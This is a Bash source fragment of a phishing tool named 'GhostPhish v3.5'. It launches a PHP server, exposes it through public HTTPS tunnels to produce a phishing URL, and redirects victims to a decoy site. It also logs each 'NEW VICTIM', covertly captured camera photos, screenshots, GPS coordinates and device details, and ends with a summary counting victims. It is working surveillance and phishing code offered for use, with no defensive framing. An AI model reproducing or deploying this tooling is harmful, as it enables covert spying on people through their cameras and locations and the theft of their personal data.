# ─── Parse log line ───
parse_log_line() {
    local line="$1"
    if echo "$line" | grep -q "NEW_VICTIM"; then
        VICTIM_COUNT=$((VICTIM_COUNT + 1))
        CURRENT_VICTIM=$(echo "$line" | grep -oP 'ID:\K[a-f0-9]+' | head -1)
        CURRENT_DIR="uploads/$CURRENT_VICTIM/"
        echo -e "${RD}🎯 ${BLD}NEW VICTIM!${NC} ${WH}ID:${NC} ${YW}$CURRENT_VICTIM${NC}"
        echo -e "   ${WH}IP:${NC} $(echo "$line" | grep -oP 'IP:\K[^\|]+' | head -1 | xargs)"
        echo ""
    elif echo "$line" | grep -q "📸 CAMERA"; then
        CAM_COUNT=$((CAM_COUNT + 1))
        local fname=$(echo "$line" | grep -oP 'File:\K[^\|]+' | head -1 | xargs)
        local fsize=$(echo "$line" | grep -oP 'Size:\K[^\|]+' | head -1 | xargs)
        echo -e "${GR}  📸 CAMERA CAPTURED${NC} ── ${WH}$fname${NC} ${CY}($fsize)${NC}"
        echo -e "     ${WH}Saved:${NC} ${YW}$CURRENT_DIR$fname${NC}"
        echo ""
    elif echo "$line" | grep -q "🖥️ SCREENSHOT"; then
        SHOT_COUNT=$((SHOT_COUNT + 1))
        local fname=$(echo "$line" | grep -oP 'File:\K[^\|]+' | head -1 | xargs)
        local fsize=$(echo "$line" | grep -oP 'Size:\K[^\|]+' | head -1 | xargs)
        echo -e "${BL}  🖥️ SCREENSHOT CAPTURED${NC} ── ${WH}$fname${NC} ${CY}($fsize)${NC}"
        echo -e "     ${WH}Saved:${NC} ${YW}$CURRENT_DIR$fname${NC}"
        echo ""
    elif echo "$line" | grep -q "📍 LOCATION"; then
        LOC_COUNT=$((LOC_COUNT + 1))
        local lat=$(echo "$line" | grep -oP 'Lat:\K[^\|]+' | head -1 | xargs)
        local lon=$(echo "$line" | grep -oP 'Lon:\K[^\|]+' | head -1 | xargs)
        local acc=$(echo "$line" | grep -oP 'Acc:\K[^\|]+' | head -1 | xargs)
        local maps=$(echo "$line" | grep -oP 'Maps:\K.*' | head -1 | xargs)
        echo -e "${MG}  📍 GPS LOCATION${NC} ── ${WH}${lat}, ${lon}${NC}"
        echo -e "     ${WH}Accuracy:${NC} ${YW}${acc}${NC}  │  ${CY}${maps}${NC}"
        echo ""
    elif echo "$line" | grep -q "📱 DEVICE"; then
        DEV_COUNT=$((DEV_COUNT + 1))
        echo -e "${PR}  📱 DEVICE INFO captured${NC}"
        echo ""
    elif echo "$line" | grep -q "❌ CAMERA ERR"; then
        ERR_COUNT=$((ERR_COUNT + 1))
        local errmsg=$(echo "$line" | grep -oP 'ID:\S+ \| \K.*' | head -1)
        echo -e "${RD}  ❌ CAMERA ERROR${NC} ── ${YW}${errmsg}${NC}"
        echo ""
    elif echo "$line" | grep -q "🔧 DIAGNOSTIC"; then
        echo -e "${CY}  🔧 DIAGNOSTIC received${NC}"
        echo ""
    elif echo "$line" | grep -q "🔀 REDIRECT"; then
        local total=$(echo "$line" | grep -oP 'Total:\K[^\|]+' | head -1 | xargs)
        echo -e "${RD}  🔀 REDIRECTED${NC} ── Total captures: ${GR}${total}${NC}"
        echo -e "${WH}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo ""
    fi
}

# ─── Tunnel selection & auto-install ───
select_and_start_tunnel() {
    echo ""
    echo -e "${CY}╔══════════════════════════════════════════╗${NC}"
    echo -e "${CY}║     🔗 TUNNEL SETUP (Auto-Install)      ║${NC}"
    echo -e "${CY}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${WH}[1]${NC} ${GR}Cloudflare Tunnel${NC} (Auto-install, HTTPS, no account)"
    echo -e "${WH}[2]${NC} ${CY}NGROK${NC} (Auto-install, HTTPS, free account needed)"
    echo -e "${WH}[3]${NC} ${YW}Localhost.run${NC} (SSH, HTTPS, no install)"
    echo -e "${WH}[4]${NC} ${PR}Serveo.net${NC} (SSH, HTTPS, custom subdomain)"
    echo -e "${WH}[5]${NC} ${GR}Localhost${NC} (http://localhost:8080 — camera works locally!)"
    echo ""
    echo -e "${RD}⚠️  CAMERA REQUIRES HTTPS OR LOCALHOST. Options 1-4 provide HTTPS.${NC}"
    echo -e "${GR}   Option 5 works ONLY if testing on the same device.${NC}"
    echo ""
    read -p "$(echo -e ${YW}"👉 Select [1-5]: "${NC})" choice
    case $choice in
        1) TUNNEL="cloudflare" ;;
        2) TUNNEL="ngrok" ;;
        3) TUNNEL="localhostrun" ;;
        4) TUNNEL="serveo" ;;
        5) TUNNEL="localhost" ;;
        *) echo -e "${RD}[!] Invalid. Using Cloudflare${NC}"; TUNNEL="cloudflare" ;;
    esac
    echo -e "${GR}[✓] Selected: $TUNNEL${NC}"

    # Start PHP
    echo -e "${YW}[*] Starting PHP server on port 8080...${NC}"
    php -S 0.0.0.0:8080 -t server/ > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 1
    echo -e "${GR}[✓] PHP server running${NC}"

    case $TUNNEL in
        cloudflare)
            if ! command -v cloudflared &>/dev/null; then
                echo -e "${YW}[*] cloudflared not found — auto-installing...${NC}"
                install_cloudflared || { echo -e "${RD}[!] Auto-install failed. Install manually.${NC}"; TUNNEL="localhost"; }
            fi
            if command -v cloudflared &>/dev/null; then
                echo -e "${YW}[*] Launching Cloudflare Tunnel...${NC}"
                cloudflared tunnel --url http://localhost:8080 > logs/cloudflare.log 2>&1 &
                TUNNEL_PID=$!
                echo -e "${YW}[*] Waiting for HTTPS URL (this takes ~5 seconds)...${NC}"
                sleep 2
                # Wait for URL to appear in logs (up to 15 seconds)
                for i in $(seq 1 15); do
                    PHISH_URL=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com' logs/cloudflare.log 2>/dev/null | head -1)
                    [ -n "$PHISH_URL" ] && break
                    sleep 1
                    echo -n "."
                done
                echo ""
                if [ -z "$PHISH_URL" ]; then
                    echo -e "${RD}[!] Cloudflare tunnel failed to start. Check logs/cloudflare.log${NC}"
                    PHISH_URL="http://localhost:8080"
                else
                    echo -e "${GR}[✓] Cloudflare Tunnel ACTIVE${NC}"
                fi
            fi
            ;;
        ngrok)
            if ! command -v ngrok &>/dev/null; then
                echo -e "${YW}[*] ngrok not found — auto-installing...${NC}"
                install_ngrok || { echo -e "${RD}[!] Auto-install failed.${NC}"; TUNNEL="localhost"; }
            fi
            if command -v ngrok &>/dev/null; then
                echo -e "${YW}[*] Launching ngrok...${NC}"
                ngrok http 8080 > /dev/null 2>&1 &
                TUNNEL_PID=$!
                sleep 3
                PHISH_URL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"https://[^"]*' | head -1 | cut -d'"' -f4)
                [ -z "$PHISH_URL" ] && PHISH_URL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"http://[^"]*' | head -1 | cut -d'"' -f4)
                [ -n "$PHISH_URL" ] && echo -e "${GR}[✓] ngrok ACTIVE${NC}" || { echo -e "${RD}[!] ngrok failed${NC}"; PHISH_URL="http://localhost:8080"; }
            fi
            ;;
        localhostrun)
            echo -e "${YW}[*] Connecting via SSH to localhost.run...${NC}"
            ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 nokey@localhost.run > logs/lhr.log 2>&1 &
            TUNNEL_PID=$!
            sleep 5
            PHISH_URL=$(grep -o 'https://[a-zA-Z0-9.-]*\.lhr\.life' logs/lhr.log 2>/dev/null | head -1)
            [ -z "$PHISH_URL" ] && { echo -e "${RD}[!] localhost.run failed${NC}"; PHISH_URL="http://localhost:8080"; }
            [ -n "$PHISH_URL" ] && echo -e "${GR}[✓] localhost.run ACTIVE${NC}"
            ;;
        serveo)
            read -p "Custom subdomain (or Enter for random): " sub
            echo -e "${YW}[*] Connecting via SSH to serveo.net...${NC}"
            if [ -n "$sub" ]; then
                ssh -o StrictHostKeyChecking=no -R "${sub}:80:localhost:8080" serveo.net > logs/serveo.log 2>&1 &
            else
                ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > logs/serveo.log 2>&1 &
            fi
            TUNNEL_PID=$!
            sleep 4
            PHISH_URL=$(grep -o 'https://[a-zA-Z0-9.-]*\.serveo\.net' logs/serveo.log 2>/dev/null | head -1)
            [ -z "$PHISH_URL" ] && { echo -e "${RD}[!] serveo failed${NC}"; PHISH_URL="http://localhost:8080"; }
            [ -n "$PHISH_URL" ] && echo -e "${GR}[✓] serveo ACTIVE${NC}"
            ;;
        localhost)
            PHISH_URL="http://localhost:8080"
            echo -e "${GR}[✓] Using localhost — camera works for local testing${NC}"
            ;;
    esac

    # Verify HTTPS if we're using a tunnel
    if [[ "$PHISH_URL" == https://* ]]; then
        echo -e "${GR}[✓] HTTPS CONFIRMED — Camera will work ✅${NC}"
    elif [[ "$PHISH_URL" == "http://localhost"* ]] || [[ "$PHISH_URL" == "http://127.0.0.1"* ]]; then
        echo -e "${GR}[✓] LOCALHOST CONFIRMED — Camera will work ✅${NC}"
    else
        echo -e "${RD}⚠️  WARNING: Non-HTTPS URL detected. Camera MAY NOT WORK.${NC}"
        echo -e "${RD}    Use a tunnel (options 1-4) for guaranteed camera capture.${NC}"
    fi
}

get_redirect_url() {
    echo ""
    echo -e "${CY}╔════════════════════════════════════╗${NC}"
    echo -e "${CY}║     🔀 REDIRECT DESTINATION       ║${NC}"
    echo -e "${CY}╚════════════════════════════════════╝${NC}"
    echo ""
    read -p "$(echo -e ${YW}"👉 URL: "${NC})" url
    [ -z "$url" ] && url="https://google.com"
    [[ ! $url =~ ^https?:// ]] && url="https://$url"
    REDIRECT_URL="$url"
    echo -e "${GR}[✓] Redirect: $REDIRECT_URL${NC}"
    cat > config.json << EOF
{"redirect_url":"$REDIRECT_URL","tunnel":"$TUNNEL","created":"$(date)"}
EOF
}

cleanup() {
    echo ""
    echo -e "${YW}[*] Shutting down GhostPhish v3.5...${NC}"
    kill $PHP_PID 2>/dev/null
    kill $TUNNEL_PID 2>/dev/null
    [ -n "$TAIL_PID" ] && kill $TAIL_PID 2>/dev/null
    rm -f "$PIPE"
    echo ""
    echo -e "${GR}╔════════════════════════════════════════╗${NC}"
    echo -e "${GR}║     HUNT SUMMARY                      ║${NC}"
    echo -e "${GR}╠════════════════════════════════════════╣${NC}"
    printf "${GR}║${NC}  🎯 Victims:      ${RD}%d${NC}\n" $VICTIM_COUNT
    printf "${GR}║${NC}  📸 Camera shots: ${GR}%d${NC}\n" $CAM_COUNT
    printf "${GR}║${NC}  🖥️ Screenshots:   ${BL}%d${NC}\n" $SHOT_COUNT
    printf "${GR}║${NC}  📍 GPS pings:     ${MG}%d${NC}\n" $LOC_COUNT
    printf "${GR}║${NC}  📱 Device info:   ${PR}%d${NC}\n" $DEV_COUNT
    printf "${GR}║${NC}  ❌ Cam errors:    ${RD}%d${NC}\n" $ERR_COUNT
    echo -e "${GR}╚════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YW}[*] Captures saved in ./uploads/${NC}"
    exit 0
}

